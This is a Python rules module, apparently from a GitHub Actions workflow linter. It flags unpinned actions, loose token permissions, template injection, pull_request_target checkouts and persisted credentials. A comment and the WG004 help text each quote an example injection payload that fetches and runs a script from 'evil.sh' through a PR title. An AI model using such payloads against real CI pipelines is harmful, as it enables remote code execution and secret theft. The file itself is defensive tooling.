"""The checks. Each rule takes a parsed workflow and yields findings.

The rules follow GitHub's own "Security hardening for GitHub Actions" guidance; see the README
for the reasoning and links behind each one.
"""

from __future__ import annotations

import re
from collections.abc import Callable, Iterator
from dataclasses import dataclass

from yaml.nodes import Node, ScalarNode

from .expressions import (
    ContextPath,
    Expression,
    ExpressionError,
    context_paths,
    find_expressions,
    is_ancestor,
    matches,
)
from .model import Finding, Severity
from .workflow import Workflow, get, key_node, scalar


@dataclass(frozen=True)
class Rule:
    id: str
    name: str
    summary: str
    check: Callable[[Workflow], Iterator[Finding]]
    help: str = ""
    """Why it matters and how to fix it; shown in code scanning (SARIF ``help``)."""


def _at(
    wf: Workflow, node: Node, rule_id: str, severity: Severity, message: str, line_offset: int = 0
) -> Finding:
    mark = node.start_mark
    return Finding(wf.path, mark.line + 1 + line_offset, mark.column + 1, rule_id, severity, message)


# --- WG001 unpinned actions -------------------------------------------------------------------

_SHA = re.compile(r"^[0-9a-f]{40}$")
# Actions maintained by GitHub itself. A moved tag there is far less likely than in a
# third-party action, so it's reported, but as low.
_FIRST_PARTY = ("actions/", "github/")


def unpinned_actions(wf: Workflow) -> Iterator[Finding]:
    for uses in wf.uses_nodes():
        yield from _check_uses(wf, uses)


def _check_uses(wf: Workflow, node: Node) -> Iterator[Finding]:
    ref = scalar(node)
    if not ref or ref.startswith("./"):
        return  # local actions live in this repository
    if ref.startswith("docker://"):
        if "@sha256:" not in ref:
            yield _at(
                wf,
                node,
                "WG001",
                Severity.MEDIUM,
                f"'{ref}' uses a Docker tag that can change; pin it with @sha256:<digest>",
            )
        return
    name, _, version = ref.partition("@")
    if not version:
        yield _at(wf, node, "WG001", Severity.HIGH, f"'{ref}' has no version at all; pin it to a commit SHA")
    elif not _SHA.match(version):
        severity = Severity.LOW if name.startswith(_FIRST_PARTY) else Severity.HIGH
        yield _at(
            wf,
            node,
            "WG001",
            severity,
            f"'{ref}' points to a tag or branch that can be moved; pin it to a full commit SHA",
        )


# --- WG002 / WG003 permissions --------------------------------------------------------------


def missing_permissions(wf: Workflow) -> Iterator[Finding]:
    if get(wf.root, "permissions") is not None:
        return
    without = [job_id for job_id, job in wf.jobs() if get(job, "permissions") is None]
    if without:
        node = key_node(wf.root, "jobs") or wf.root
        yield _at(
            wf,
            node,
            "WG002",
            Severity.MEDIUM,
            "no 'permissions:' at the top or in job(s) "
            + ", ".join(without)
            + "; the GITHUB_TOKEN gets the repository default, which may allow writes."
            " Add e.g. 'permissions: contents: read'",
        )


def write_all(wf: Workflow) -> Iterator[Finding]:
    candidates: list[tuple[str, Node | None]] = [("workflow", get(wf.root, "permissions"))]
    candidates += [(f"job '{job_id}'", get(job, "permissions")) for job_id, job in wf.jobs()]
    for where, node in candidates:
        if scalar(node) == "write-all":
            yield _at(
                wf, node, "WG003", Severity.HIGH, f"{where} grants 'write-all'; list only the scopes it needs"
            )


# --- WG004 template injection ---------------------------------------------------------------

# Context values an outsider controls: titles, bodies, branch names, commit messages...
# Placed straight into a shell script, "a`; curl evil.sh | sh`" in a PR title runs as code.
# Paths as context_paths() returns them: lower case, "*" for any array element.
_UNTRUSTED: tuple[tuple[str, ...], ...] = tuple(
    tuple(p.split("."))
    for p in (
        "github.head_ref",
        "github.event.issue.title",
        "github.event.issue.body",
        "github.event.pull_request.title",
        "github.event.pull_request.body",
        "github.event.pull_request.head.ref",
        "github.event.pull_request.head.label",
        "github.event.pull_request.head.repo.default_branch",
        "github.event.comment.body",
        "github.event.review.body",
        "github.event.review_comment.body",
        "github.event.discussion.title",
        "github.event.discussion.body",
        "github.event.pages.*.page_name",
        "github.event.commits.*.message",
        "github.event.commits.*.author.email",
        "github.event.commits.*.author.name",
        "github.event.head_commit.message",
        "github.event.head_commit.author.email",
        "github.event.head_commit.author.name",
        "github.event.workflow_run.head_branch",
        "github.event.workflow_run.head_commit.message",
        "github.event.workflow_run.head_commit.author.email",
        "github.event.workflow_run.head_commit.author.name",
    )
)


def _untrusted_value(path: ContextPath, in_action: bool) -> tuple[Severity, str] | None:
    """Severity and message if ``path`` can carry text an outsider (or a caller) chose."""
    if any(matches(path.segments, pattern) for pattern in _UNTRUSTED):
        return Severity.HIGH, (
            f"'{path}' can be set by outsiders and is pasted into a script;"
            " pass it through 'env:' and use the variable instead"
        )
    if path.function == "tojson":
        inside = next((p for p in _UNTRUSTED if is_ancestor(path.segments, p)), None)
        if inside is not None:
            return Severity.HIGH, (
                f"toJSON({path}) includes values outsiders can set, such as '{'.'.join(inside)}',"
                " and is pasted into a script; pass it through 'env:' and use the variable instead"
            )
    # In a composite action, inputs come from whichever workflow calls it, and that workflow may
    # pass a pull request title straight through: the action can't know, so it must not trust them.
    if in_action and len(path.segments) >= 2 and path.segments[0] == "inputs":
        return Severity.MEDIUM, (
            f"'{path}' comes from the calling workflow, which may pass untrusted"
            " text, and is pasted into a script; pass it through 'env:' and use the"
            " variable instead"
        )
    return None


def _paths(expr: Expression) -> list[ContextPath]:
    try:
        return context_paths(expr.inner)
    except ExpressionError:
        return []  # GitHub rejects the workflow before anything runs


def template_injection(wf: Workflow) -> Iterator[Finding]:
    for step in wf.steps():
        targets = [get(step.node, "run")]
        if (step.uses or "").startswith("actions/github-script@"):
            targets.append(get(get(step.node, "with"), "script"))
        for node in targets:
            if not isinstance(node, ScalarNode):
                continue
            for expr in find_expressions(node.value):
                hit = next((r for path in _paths(expr) if (r := _untrusted_value(path, wf.is_action))), None)
                if hit is None:
                    continue
                offset = node.value.count("\n", 0, expr.start)
                if node.style in ("|", ">"):
                    offset += 1  # the text starts on the line after "run: |"
                severity, message = hit
                yield _at(wf, node, "WG004", severity, message, line_offset=offset)


# --- WG005 pull_request_target ---------------------------------------------------------------

_PR_HEAD = (
    ("github", "event", "pull_request", "head", "sha"),
    ("github", "event", "pull_request", "head", "ref"),
    ("github", "head_ref"),
)


def _checks_out_pr_code(ref: str) -> bool:
    """``ref:`` of actions/checkout naming the pull request's code: its head, by expression,
    or GitHub's ``refs/pull/<n>/head`` / ``merge`` refs."""
    if "refs/pull/" in ref:
        return True
    return any(
        matches(path.segments, pattern)
        for expr in find_expressions(ref)
        for path in _paths(expr)
        for pattern in _PR_HEAD
    )


def pull_request_target(wf: Workflow) -> Iterator[Finding]:
    if "pull_request_target" not in wf.triggers():
        return
    risky = False
    for step in wf.steps():
        if (step.uses or "").startswith("actions/checkout@"):
            if _checks_out_pr_code(step.with_value("ref") or ""):
                risky = True
                yield _at(
                    wf,
                    step.node,
                    "WG005",
                    Severity.HIGH,
                    "checks out the pull request's code under 'pull_request_target', which runs"
                    " with secrets and a write token; a fork's PR can then run its own code",
                )
    if not risky:
        node = key_node(wf.root, "on") or wf.root
        yield _at(
            wf,
            node,
            "WG005",
            Severity.LOW,
            "'pull_request_target' runs with secrets for pull requests from forks;"
            " make sure no step runs code from the pull request",
        )


# --- WG006 persisted credentials -------------------------------------------------------------


def persisted_credentials(wf: Workflow) -> Iterator[Finding]:
    for step in wf.steps():
        if not (step.uses or "").startswith("actions/checkout@"):
            continue
        if (step.with_value("persist-credentials") or "").lower() != "false":
            yield _at(
                wf,
                get(step.node, "uses") or step.node,
                "WG006",
                Severity.LOW,
                "actions/checkout leaves the token in .git/config for later steps;"
                " set 'persist-credentials: false' unless a step pushes",
            )


RULES: tuple[Rule, ...] = (
    Rule(
        "WG001",
        "unpinned-action",
        "Actions and reusable workflows not pinned to a commit SHA",
        unpinned_actions,
        help=(
            "A tag or branch such as @v4 can be moved to different code after you've reviewed it; a "
            "full 40-character commit SHA can't. Pin with uses: owner/repo@<sha>  # v4 (workflow-"
            "guard --fix does this)."
        ),
    ),
    Rule(
        "WG002",
        "missing-permissions",
        "No explicit GITHUB_TOKEN permissions",
        missing_permissions,
        help=(
            "Without permissions: the GITHUB_TOKEN gets the repository's default, which may be "
            "read/write for everything. Add permissions: contents: read at the top and widen it per "
            "job only where needed."
        ),
    ),
    Rule(
        "WG003",
        "write-all",
        "'permissions: write-all'",
        write_all,
        help=(
            "write-all gives every step a token that can push code, create releases and change "
            "issues. List only the scopes the job needs."
        ),
    ),
    Rule(
        "WG004",
        "template-injection",
        "Untrusted ${{ }} values (or a composite action's inputs) inside run: or github-script",
        template_injection,
        help=(
            "${{ }} values are pasted into the script before it runs, so a pull request title like "
            '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
            "script instead. In a composite action the same goes for ${{ inputs.* }}: the calling "
            "workflow may pass untrusted text."
        ),
    ),
    Rule(
        "WG005",
        "pull-request-target",
        "pull_request_target, especially with a checkout of the PR",
        pull_request_target,
        help=(
            "pull_request_target runs with secrets and a write token even for pull requests from "
            "forks. Never check out and run the pull request's code in it; use pull_request instead "
            "where possible."
        ),
    ),
    Rule(
        "WG006",
        "persisted-credentials",
        "actions/checkout without persist-credentials: false",
        persisted_credentials,
        help=(
            "actions/checkout stores the token in .git/config, where every later step (and anything "
            "it downloads) can read it. Set persist-credentials: false unless a step pushes."
        ),
    ),
)
RULE_IDS = frozenset(r.id for r in RULES)


def check(wf: Workflow, ignore: frozenset[str] = frozenset()) -> list[Finding]:
    """All findings for one workflow, minus ignored rules and inline ``ignore[...]`` comments."""
    found: list[Finding] = []
    for rule in RULES:
        if rule.id in ignore:
            continue
        for finding in rule.check(wf):
            if not wf.is_ignored(finding.line, finding.rule_id):
                found.append(finding)
    return sorted(found)
